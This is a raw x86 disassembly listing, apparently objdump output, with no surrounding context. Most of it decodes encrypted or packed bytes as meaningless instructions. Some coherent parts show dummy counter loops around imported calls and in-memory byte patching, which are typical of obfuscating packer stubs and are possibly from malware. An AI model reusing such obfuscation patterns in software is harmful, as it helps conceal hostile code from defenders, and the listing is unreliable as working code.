  4063cd:	enter  0x2ce0,0x32
  4063d1:	push   ds
  4063d2:	dec    esp
  4063d3:	aam    0x31
  4063d5:	jle    0x406455
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x4063bf
  4063dc:	mov    al,0xf
  4063de:	mov    edi,ds
  4063e0:	sti    
  4063e1:	and    eax,0x8c42f658
  4063e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063e7:	mov    edx,0xb7d4a0ee
  4063ec:	or     DWORD PTR ds:0x8ae1c985,esp
  4063f2:	arpl   WORD PTR [esi+0x53f59f8c],sp
  4063f8:	(bad)  
  4063fa:	or     bh,BYTE PTR [esi-0x74]
  4063fd:	and    eax,0xb0319081
  406402:	mov    ebx,0x48d5d6eb
  406407:	add    BYTE PTR [edi+0x926c7e8],ah
  40640d:	retf   0xde2
  406410:	inc    eax
  406411:	call   DWORD PTR [ecx]
  406413:	fdivr  QWORD PTR [eax]
  406416:	icebp  
  406417:	dec    ecx
  406418:	dec    edi
  406419:	adc    ebp,DWORD PTR [eax]
  40641b:	jne    0x40639d
  40641d:	mov    eax,ds:0x49c7da76
  406422:	jp     0x40645a
  406424:	fs es add edx,ebx
  406428:	xor    BYTE PTR [esi],al
  40642a:	adc    ebp,DWORD PTR [ebx-0x2534b67c]
  406430:	mov    eax,ds:0x814ebc90
  406435:	jmp    ecx
  406437:	jo     0x4064a6
  406439:	call   FWORD PTR [edi]
  40643b:	dec    edi
  40643c:	ds mov dh,bh
  40643f:	test   eax,0x8f579916
  406444:	ficom  DWORD PTR [eax+0x58]
  406447:	cld    
  406448:	inc    edx
  406449:	sub    BYTE PTR [esi-0x66],0xb5
  40644d:	mov    ecx,0x22912c4b
  406452:	jmp    0x79c0:0x2f3aae3b
  406459:	mov    ebx,0xe23afda2
  40645e:	or     eax,eax
  406460:	psraw  mm5,QWORD PTR [ebp+0x15]
  406464:	xor    al,0xbf
  406466:	ret    
  406467:	or     BYTE PTR [edi+edi*4-0x77ce3062],dl
  40646e:	mov    ds,WORD PTR [ebx+0x6936144c]
  406474:	xchg   ebx,eax
  406475:	cmp    eax,0x19bf104a
  40647a:	fidiv  WORD PTR ds:[edx]
  40647d:	arpl   WORD PTR [ebx],dx
  40647f:	pop    ds
  406480:	mov    eax,0xda04e1b
  406485:	loop   0x40644b
  406487:	or     al,cl
  406489:	int3   
  40648a:	add    ah,0x95
  40648d:	add    eax,0x6f3b6956
  406492:	outs   dx,DWORD PTR ds:[esi]
  406493:	addr16 in al,dx
  406495:	cld    
  406496:	sbb    BYTE PTR ds:0xabe5279,ah
  40649c:	in     eax,dx
  40649d:	push   ebp
  40649e:	mov    esp,0xe723090d
  4064a3:	mov    ebx,0x33f57330
  4064a8:	jnp    0x406494
  4064aa:	xor    BYTE PTR [ecx],bh
  4064ac:	cmp    al,0xa2
  4064ae:	jno    0x4064a9
  4064b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064b1:	outs   dx,BYTE PTR ds:[esi]
  4064b2:	mov    ebp,0xd60be578
  4064b7:	fstp   st(0)
  4064b9:	rcl    DWORD PTR [ebp-0x1a],1
  4064bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064bd:	pop    ebx
  4064be:	and    BYTE PTR [ebx+ecx*4],dl
  4064c1:	out    dx,al
  4064c2:	int    0x95
  4064c4:	ret    
  4064c5:	xchg   BYTE PTR [edi+0x2b0061e7],cl
  4064cb:	sbb    ah,BYTE PTR [ebp-0x5e42dd89]
  4064d1:	daa    
  4064d2:	(bad)
  4064d5:	xchg   esp,eax
  4064d6:	daa    
  4064d7:	cdq    
  4064d8:	cwde   
  4064d9:	out    0x22,al
  4064db:	push   0xe8de349e
  4064e0:	repz fcom QWORD PTR ds:0xb9362e8c
  4064e7:	loope  0x40654c
  4064e9:	aad    0x81
  4064eb:	push   0x33bd55e8
  4064f0:	sub    BYTE PTR [edx],dl
  4064f2:	jmp    0x256f420c
  4064f7:	lds    eax,FWORD PTR [esi+0x60e39d90]
  4064fd:	ins    DWORD PTR es:[edi],dx
  4064fe:	popa   
  4064ff:	push   edx
  406500:	sub    eax,0xf5bc8d4a
  406505:	push   ecx
  406506:	jge    0x406551
  406508:	fisub  DWORD PTR [esi]
  40650a:	sbb    ah,BYTE PTR [eax+edi*4+0x3cc5aa39]
  406511:	mov    ecx,0xeb7e82d2
  406516:	adc    DWORD PTR [edx+0x78],eax
  406519:	lea    esi,[edi+0x7d909321]
  40651f:	dec    eax
  406520:	jmp    0x4064f2
  406522:	or     eax,esi
  406524:	jle    0x406557
  406526:	fldenv [ebp-0x5]
  406529:	xchg   BYTE PTR [ebp-0x27],ah
  40652c:	inc    ecx
  40652d:	push   edx
  40652e:	scas   al,BYTE PTR es:[edi]
  40652f:	mov    al,ds:0x3955605f
  406534:	or     bl,BYTE PTR [ecx-0x213f67bd]
  40653a:	rol    DWORD PTR [edi],cl
  40653c:	ret    0xc434
  40653f:	or     al,0x8c
  406541:	scas   al,BYTE PTR es:[edi]
  406542:	dec    edi
  406543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406544:	push   edi
  406545:	push   cs
  406546:	and    BYTE PTR [eax-0x3c],0x60
  40654a:	leave  
  40654b:	jmp    0x81e6:0x46027909
  406552:	outs   dx,DWORD PTR ds:[esi]
  406553:	and    esi,esp
  406555:	ficomp WORD PTR [eax]
  406557:	ins    BYTE PTR es:[edi],dx
  406558:	ret    0xe8e1
  40655b:	push   ecx
  40655c:	xchg   BYTE PTR [edx-0x6f65be74],cl
  406562:	(bad)  
  406563:	fsub   st(4),st
  406565:	sub    eax,0x7c0094f0
  40656a:	pop    es
  40656b:	leave  
  40656c:	imul   esi,DWORD PTR [ecx+0x39],0xffffffaf
  406570:	xor    BYTE PTR [ecx-0x3d],ah
  406573:	mov    DWORD PTR ss:[ecx+ecx*4+0x78],edx
  406578:	cwde   
  406579:	mov    bl,0xfb
  40657b:	test   BYTE PTR [ecx-0x3],dh
  40657e:	aaa    
  40657f:	jb     0x406600
  406581:	daa    
  406582:	mov    eax,ds:0xdf9e2328
  406587:	or     eax,0xab3d766
  40658c:	call   0x615fafc1
  406591:	mov    bh,0x51
  406593:	mov    gs,WORD PTR [ebx]
  406595:	xor    al,0xf7
  406597:	pop    esp
  406598:	push   ecx
  406599:	sbb    eax,0x82afd489
  40659e:	imul   eax,DWORD PTR [eax-0x4a84e981],0xd9f7675a
  4065a8:	outs   dx,DWORD PTR ds:[esi]
  4065a9:	dec    ebx
  4065aa:	cmp    al,0xc6
  4065ac:	call   0xc1b6:0x5ee1261c
  4065b3:	test   BYTE PTR [ecx],ch
  4065b5:	pop    es
  4065b6:	call   0x404d49
  4065bb:	test   eax,eax
  4065bd:	je     0x4065e8
  4065c3:	lea    eax,[ebp-0x78]
  4065c6:	push   eax
  4065c7:	mov    eax,DWORD PTR [ebp-0x14]
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1+0x3d022eeb]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x40667f
  40660b:	out    0xc7,eax
  40660d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40660e:	in     al,dx
  40660f:	jo     0x406593
  406611:	arpl   WORD PTR [eax+0x2b],cx
  406614:	pop    eax
  406615:	add    DWORD PTR [ebp+0x50407c69],edi
  40661b:	dec    edx
  40661c:	sbb    al,0xed
  40661e:	or     ebp,0x19d9e2a1
  406624:	dec    esi
  406625:	adc    dh,al
  406627:	mov    esi,0x9c341a90
  40662c:	(bad)  
  40662d:	int    0x4a
  40662f:	in     eax,dx
  406630:	mov    ebx,0x72cd8203
  406635:	jae    0x406615
  406637:	stos   BYTE PTR es:[edi],al
  406638:	rcr    DWORD PTR [esi],0x67
  40663b:	adc    BYTE PTR [esi+0x43],dl
  40663e:	out    0x46,al
  406640:	jl     0x406620
  406642:	push   0xffffff97
  406644:	push   ss
  406645:	mov    bh,0xc2
  406647:	retf   
  406648:	adc    eax,0x2e9151aa
  40664d:	cmp    edi,esp
  40664f:	jo     0x4065ef
  406651:	adc    ah,0xde
  406654:	xchg   ebp,eax
  406655:	mov    al,ds:0x47a487b4
  40665a:	stos   DWORD PTR es:[edi],eax
  40665b:	out    dx,eax
  40665c:	dec    esi
  40665d:	xor    eax,0xd4c126b3
  406662:	cmp    esp,DWORD PTR [esi-0x5e]
  406665:	ss (bad) 
  406667:	xor    al,0x3f
  406669:	js     0x406619
  40666b:	cli    
  40666c:	nop
  40666d:	call   0xb10f:0x2c8cbc8b
  406674:	xchg   BYTE PTR [edx],ch
  406676:	setae  BYTE PTR [esi]
  406679:	jns    0x40663f
  40667b:	popf   
  40667c:	mov    ecx,0xbad9037f
  406681:	or     eax,0x46e0bfd4
  406686:	and    al,0xe9
  406688:	xlat   BYTE PTR ds:[ebx]
  406689:	bound  edi,QWORD PTR [eax+eax*4+0x75]
  40668d:	cmp    al,0x61
  40668f:	inc    ebx
  406690:	test   DWORD PTR [edi-0x6ae92b3a],ebp
  406696:	sahf   
  406697:	loope  0x406698
  406699:	and    eax,0x2e6a20f7
  40669e:	fild   WORD PTR [ebp+0x7ad9008b]
  4066a4:	cs push ds
  4066a6:	fst    QWORD PTR [eax+eax*4-0x3a]
  4066aa:	lods   al,BYTE PTR ds:[esi]
  4066ab:	out    dx,eax
  4066ac:	in     eax,0x40
  4066ae:	dec    ebp
  4066af:	sub    eax,0x2c9ae670
  4066b4:	retf   
  4066b5:	aad    0xd7
  4066b7:	pop    es
  4066b8:	inc    ah
  4066ba:	into   
  4066bb:	(bad)  
  4066bc:	xchg   esp,eax
  4066bd:	add    DWORD PTR [esi+esi*8+0x7b],esi
  4066c1:	arpl   di,di
  4066c3:	xor    BYTE PTR [esi+0x6],al
  4066c6:	mov    al,BYTE PTR [edi]
  4066c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066c9:	fdivr  DWORD PTR [edi+ecx*2]
  4066cc:	pop    es
  4066cd:	sbb    eax,0xca4692a5
  4066d2:	pop    edx
  4066d3:	bnd call 0xd377f3ef
  4066d9:	std    
  4066da:	in     al,0xad
  4066dc:	adc    eax,DWORD PTR [eax]
  4066de:	or     DWORD PTR [ecx-0x16],edx
  4066e1:	stos   BYTE PTR es:[edi],al
  4066e2:	dec    esi
  4066e3:	dec    edi
  4066e4:	adc    DWORD PTR [esi],edi
  4066e6:	pusha  
  4066e7:	dec    edx
  4066e8:	pop    edx
  4066e9:	into   
  4066ea:	fisubr DWORD PTR [ebp-0x38a7bf44]
  4066f0:	sbb    eax,0x77f67d24
  4066f5:	repz rcl BYTE PTR [esi+ebx*2-0x64],cl
  4066fa:	push   esp
  4066fb:	push   edi
  4066fc:	jle    0x40670f
  4066fe:	inc    eax
  4066ff:	pop    eax
  406700:	call   0x5711a344
  406705:	jno    0x4066d9
  406707:	inc    ebp
  406708:	dec    ecx
  406709:	ss js  0x4066ee
  40670c:	mov    dl,0xa0
  40670e:	sub    DWORD PTR [edi-0x386d8be7],edx
  406714:	pop    ss
  406715:	xor    esi,ebx
  406717:	cmp    edi,DWORD PTR [ecx-0x5e72f60c]
  40671d:	aad    0x3f
  40671f:	out    0xdd,eax
  406721:	in     al,dx
  406722:	push   ebx
  406723:	or     eax,0xce533930
  406728:	add    BYTE PTR fs:[ebp+esi*2-0x3a],ah
  40672d:	inc    ecx
  40672e:	idiv   DWORD PTR [eax-0x38315a86]
  406734:	cmp    DWORD PTR [ecx],ebx
  406736:	jmp    0xa48f:0xba7f4e15
  40673d:	mov    cl,0xf
  40673f:	ins    BYTE PTR es:[edi],dx
  406740:	shr    BYTE PTR [esi],0xe0
  406743:	mov    ah,0x3c
  406745:	je     0x40679d
  406747:	test   eax,0x8646edf8
  40674c:	inc    esi
  40674d:	sub    ch,BYTE PTR [esi]
  40674f:	cli    
  406750:	lea    ebp,[edi-0x22]
  406753:	pop    edi
  406754:	scas   al,BYTE PTR es:[edi]
  406755:	jns    0x406720
  406757:	cld    
  406758:	ja     0x406782
  40675a:	inc    edx
  40675b:	adc    al,0x61
  40675d:	xchg   edx,eax
  40675e:	adc    al,0xcd
  406760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406761:	or     eax,0x8300ecdb
  406766:	ret    
  406767:	jl     0x40672e
  406769:	sub    ecx,DWORD PTR [ebx]
  40676b:	or     edx,DWORD PTR [eax+0x3e]
  40676e:	mov    ds:0xe76ac0b9,eax
  406773:	outs   dx,DWORD PTR ds:[esi]
  406774:	add    DWORD PTR [ebp+ebx*8-0x50],ebx
  406778:	jmp    0xb0a8:0x5b5b57b2
  40677f:	sbb    al,0x8c
  406781:	stos   DWORD PTR es:[edi],eax
  406782:	sbb    esi,edi
  406784:	jbe    0x40679d
  406786:	mov    bh,0x57
  406788:	jno    0x406757
  40678a:	setne  BYTE PTR [edi+0x63e0de98]
  406791:	sahf   
  406792:	push   0x685f7065
  406797:	stos   DWORD PTR es:[edi],eax
  406798:	jp     0x406738
  40679a:	cmp    eax,ecx
  40679c:	(bad)  
  40679e:	xchg   edi,eax
  40679f:	mov    dl,0x4
  4067a1:	and    al,0x24
  4067a3:	cli    
  4067a4:	sub    ecx,esp
  4067a6:	or     bl,al
  4067a8:	dec    esi
  4067a9:	inc    esp
  4067aa:	fcom   st(0)
  4067ac:	push   cs
  4067ad:	jb     0x406774
  4067af:	bound  eax,QWORD PTR [eax-0x30e6c749]
  4067b5:	pop    ebx
  4067b6:	add    eax,DWORD PTR [ebp+0x56]
  4067b9:	in     al,0xd6
  4067bb:	inc    ebx
  4067bc:	stos   BYTE PTR es:[edi],al
  4067bd:	mov    edi,ebx
  4067bf:	sahf   
  4067c0:	into   
  4067c1:	pusha  
  4067c2:	mov    ds:0x52baa97c,eax
  4067c7:	mov    al,ds:0x843da349
  4067cc:	int    0x25
  4067ce:	aad    0x96
  4067d0:	or     ebp,DWORD PTR [eax+0x14]
  4067d3:	dec    ebp
  4067d4:	imul   eax,DWORD PTR [edx+0x46e853ec],0x271baab7
  4067de:	xlat   BYTE PTR ds:[ebx]
  4067df:	mov    bl,0x0
  4067e1:	pop    ebx
  4067e2:	adc    ebp,DWORD PTR [eax-0x729a4780]
  4067e8:	int    0xff
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0x52fb:0xff16f6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	in     al,0xe5
  406866:	inc    edx
  406867:	std    
  406868:	sub    eax,0x86a4f3f6
  40686d:	daa    
  40686e:	sbb    esi,DWORD PTR [edx+edi*1]
  406871:	inc    ebx
  406872:	jns    0x4068d5
  406874:	mov    edi,0xcc55811b
  406879:	ja     0x40687a
  40687b:	or     dl,ch
  40687d:	outs   dx,DWORD PTR ds:[esi]
  40687e:	scas   al,BYTE PTR es:[edi]
  40687f:	cmp    al,0x83
  406881:	mov    bh,0x4d
  406883:	sbb    DWORD PTR gs:[edi],0xf5c4cd56
  40688a:	loope  0x4068de
  40688c:	and    DWORD PTR [eax-0x3d],ebp
  40688f:	scas   al,BYTE PTR es:[edi]
  406890:	mov    dl,0xe9
  406892:	ja     0x40689e
  406894:	adc    esp,ecx
  406896:	jecxz  0x406840
  406898:	ja     0x4068b9
  40689a:	mov    bl,0xaa
  40689c:	cmp    dh,cl
  40689e:	push   esi
  40689f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068a0:	jb     0x406911
  4068a2:	mov    bh,0x78
  4068a4:	xor    edx,DWORD PTR [esi]
  4068a6:	pop    es
  4068a7:	and    esi,ecx
  4068a9:	aam    0x58
  4068ab:	bound  edi,QWORD PTR [esi+0x613dd9b5]
  4068b1:	aam    0x59
  4068b3:	and    eax,0x205d7f54
  4068b8:	mov    dh,BYTE PTR [ecx+0x3475fe6c]
  4068be:	xlat   BYTE PTR ds:[ebx]
  4068bf:	mov    ecx,0x2e549203
  4068c4:	adc    al,0x9d
  4068c6:	retf   
  4068c7:	mov    WORD PTR [ecx+0x7eec0c92],ss
  4068cd:	push   ss
  4068ce:	enter  0xb445,0x8d
  4068d2:	or     dh,BYTE PTR [edx]
  4068d4:	cwde   
  4068d5:	in     al,dx
  4068d6:	cmc    
  4068d7:	and    BYTE PTR [ebp-0x65],bh
  4068da:	jnp    0x406888
  4068dc:	xor    BYTE PTR [ebx-0x3ce32ccc],al
  4068e2:	call   0x331b8f76
  4068e7:	add    al,0x82
  4068e9:	nop
  4068ea:	push   ss
  4068eb:	adc    DWORD PTR [edi+0x260d7b11],ebx
  4068f1:	sub    DWORD PTR [eax+0x7f01350d],ebx
  4068f7:	and    BYTE PTR [ebp+0x2d],al
  4068fa:	out    dx,eax
  4068fb:	inc    eax
  4068fc:	nop
  4068fd:	mov    cl,BYTE PTR ds:0x537bc614
  406903:	jb     0x406941
  406905:	xor    eax,0xb1301774
  40690a:	ret    
  40690b:	xchg   edi,eax
  40690c:	popa   
  40690d:	jmp    0xd77d:0x298985f7
  406914:	cmp    BYTE PTR [ebx-0x4e],0xf6
  406918:	out    dx,al
  406919:	sbb    BYTE PTR [esi],0x2e
  40691c:	mov    dl,0xa0
  40691e:	nop
  40691f:	arpl   WORD PTR [ebx-0x1c],di
  406922:	jmp    0xfaec:0x108dc992
  406929:	pop    esi
  40692a:	std    
  40692b:	int    0xc9
  40692d:	sub    BYTE PTR [edi-0x65],0x59
  406931:	xor    BYTE PTR [edi],bl
  406933:	imul   ecx,DWORD PTR [ecx],0xba23424c
  406939:	lahf   
  40693a:	leave  
  40693b:	hlt    
  40693c:	xor    eax,0xc87038c6
  406941:	inc    edx
  406942:	int3   
  406943:	(bad)  
  406944:	mov    edx,0xf91fa08b
  406949:	loop   0x406928
  40694b:	gs jmp 0x38609b28
  406951:	out    0x3c,al
  406953:	ss pop esp
  406955:	jle    0x406957
  406957:	adc    eax,0x429d93a
  40695c:	xchg   esi,eax
  40695d:	and    esi,0xcc49a472
  406963:	imul   ebx,DWORD PTR [esi+eax*1-0x5ef13722],0x22038e6c
  40696e:	mov    esi,0xc16c0653
  406973:	mov    edx,DWORD PTR [esi-0x5a]
  406976:	icebp  
  406977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406978:	lahf   
  406979:	loope  0x40695b
  40697b:	dec    ebx
  40697c:	or     ah,BYTE PTR [edi-0x5a254ba4]
  406982:	mov    cs,WORD PTR [ecx]
  406984:	adc    edx,edx
  406986:	out    dx,eax
  406987:	adc    BYTE PTR [esi],cl
  406989:	stc    
  40698a:	xchg   ebx,eax
  40698b:	lock loopne 0x4069da
  40698e:	jb     0x4069d4
  406990:	scas   al,BYTE PTR es:[edi]
  406991:	cmp    ebp,DWORD PTR [esi]
  406993:	jno    0x406977
  406995:	dec    ecx
  406996:	add    BYTE PTR [esp+edx*8],ah
  406999:	or     esp,DWORD PTR [ebx-0x30]
  40699c:	cmp    DWORD PTR [edi+0x15],eax
  40699f:	add    eax,0xc6cbe2c0
  4069a4:	pop    ds
  4069a5:	cmp    eax,0xab731ac7
  4069aa:	(bad)  
  4069ab:	repnz out 0x6b,eax
  4069ae:	shl    BYTE PTR [esi+0x7b],cl
  4069b1:	mov    cl,0x85
  4069b3:	sub    DWORD PTR [ebx],esp
  4069b5:	pop    ecx
  4069b6:	ins    DWORD PTR es:[edi],dx
  4069b7:	fdiv   st(0),st
  4069b9:	je     0x4069de
  4069bb:	cmp    BYTE PTR es:[ebx],dh
  4069be:	jmp    0x406a0c
  4069c0:	mov    DWORD PTR [ebx+0x5],ebx
  4069c3:	pop    es
  4069c4:	pop    esp
  4069c5:	mov    bl,0x27
  4069c7:	fwait
  4069c8:	xor    al,0x2d
  4069ca:	add    DWORD PTR [ecx-0x49],0x37
  4069ce:	mov    eax,ds:0x9f9fabfd
  4069d3:	jae    0x406a52
  4069d5:	aaa    
  4069d6:	xor    BYTE PTR [edx-0x29ab4fa6],0x94
  4069dd:	gs ds push 0x4c
  4069e1:	bound  esi,QWORD PTR [ecx]
  4069e3:	mov    esp,ecx
  4069e5:	repnz adc al,0x51
  4069e8:	pop    edx
  4069e9:	call   0x806f4908
  4069ee:	stos   BYTE PTR es:[edi],al
  4069ef:	push   edx
  4069f0:	ins    BYTE PTR es:[edi],dx
  4069f1:	scas   al,BYTE PTR es:[edi]
  4069f2:	pushf  
  4069f3:	cmp    ch,ch
  4069f5:	pop    es
  4069f6:	dec    ebp
  4069f7:	dec    esp
  4069f8:	sub    BYTE PTR [ecx+0x2c],ah
  4069fb:	stos   DWORD PTR es:[edi],eax
  4069fc:	adc    ecx,ecx
  4069fe:	mov    ds:0xa426567d,eax
  406a03:	retf   0x8614
  406a06:	pusha  
  406a07:	adc    dh,BYTE PTR [edi]
  406a09:	or     al,0xac
  406a0b:	test   BYTE PTR [eax],ch
  406a0d:	lea    esp,[ecx]
  406a0f:	rol    BYTE PTR [eax-0x4fdd44b],cl
  406a15:	jg     0x406a84
  406a17:	ret    
  406a18:	mov    ecx,0x40734d7b
  406a1d:	ins    BYTE PTR es:[edi],dx
  406a1e:	jne    0x406a8b
  406a20:	cmp    al,0x17
  406a22:	dec    edx
  406a23:	test   al,0x95
  406a25:	push   ds
  406a26:	ja     0x406a96
  406a28:	pop    ebp
  406a29:	lahf   
  406a2a:	inc    esp
  406a2b:	mov    al,ds:0xa1b48614
  406a30:	aad    0x7a
  406a32:	xlat   BYTE PTR ds:[ebx]
  406a33:	mov    bl,0x8b
  406a35:	jmp    FWORD PTR [ebx]
  406a37:	mov    ch,0x4c
  406a39:	outs   dx,BYTE PTR ds:[esi]
  406a3a:	int    0x5a
  406a3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a3d:	dec    edx
  406a3e:	mov    al,0x58
  406a40:	call   DWORD PTR [eax+0x1]
  406a43:	mov    eax,DWORD PTR [ebp-0x20]
  406a46:	mov    ecx,DWORD PTR ds:0x412224
  406a4c:	add    DWORD PTR [eax],ecx
  406a4e:	pop    edi
  406a4f:	pop    esi
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ec63,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ec63,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ec63,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42ea9b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ec63
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ec63,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x430367
  406aa5:	xor    edi,DWORD PTR ds:0x4302b5
  406aab:	mov    DWORD PTR ds:0x430367,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x4302dd,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x4302dd
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x4302dd,ecx
  406ad3:	cmp    DWORD PTR ds:0x4302dd,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e737
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42ea9f
  406af9:	cmp    DWORD PTR ds:0x4302dd,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x43035f,0x15
  406b1d:	cmp    DWORD PTR ds:0x43035f,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x43035f,0x16
  406b31:	jne    0x406b3d
  406b37:	call   DWORD PTR ds:0x42e85f
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x43035f
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x43035f,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x4302b5,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x430357,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x430357
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x430357,ecx
  406b87:	cmp    DWORD PTR ds:0x430357,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x430357,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e666
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42e927
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e648
  406bcd:	add    DWORD PTR ds:0x4302bd,ecx
  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42ec4b
  406bdf:	and    edi,DWORD PTR ds:0x430363
  406be5:	mov    DWORD PTR ds:0x42ec4b,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0x389c7504
  406bfe:	es cld 
  406c00:	cmp    bh,BYTE PTR gs:[esi+0x7e]
  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406c53
  406c09:	and    ch,BYTE PTR [ebx-0x34511d0b]
  406c0f:	fs cmc 
  406c11:	(bad)  
  406c13:	pushf  
  406c14:	mov    esp,ebx
  406c16:	rcl    DWORD PTR [eax+0x36d82d3],1
  406c1c:	adc    eax,0xf1a51097
  406c21:	(bad)  
  406c22:	dec    edx
  406c23:	mov    ebp,0x2f7fedcb
  406c28:	les    esp,FWORD PTR [esi]
  406c2a:	sbb    eax,ebx
  406c2c:	add    dl,BYTE PTR [esi-0x2e]
  406c2f:	add    eax,0x670c7985
  406c34:	and    eax,esi
  406c36:	inc    eax
  406c37:	hlt    
  406c38:	push   es
  406c39:	pop    ss
  406c3a:	pusha  
  406c3b:	push   esp
  406c3c:	lock add eax,0x182b97d6
  406c42:	fwait
  406c43:	sub    al,0xcf
  406c45:	sub    eax,0x1ee4f82f
  406c4a:	loope  0x406be3
  406c4c:	jmp    0x406c3d
  406c4e:	inc    ebp
  406c4f:	sbb    BYTE PTR [edx],ah
  406c51:	sub    BYTE PTR [edi+0x3df59795],ah
  406c57:	jno    0x406c0b
  406c59:	pop    ebx
  406c5a:	mov    es,WORD PTR [edi+0x4f]
  406c5d:	sbb    esi,DWORD PTR [ebx]
  406c5f:	lahf   
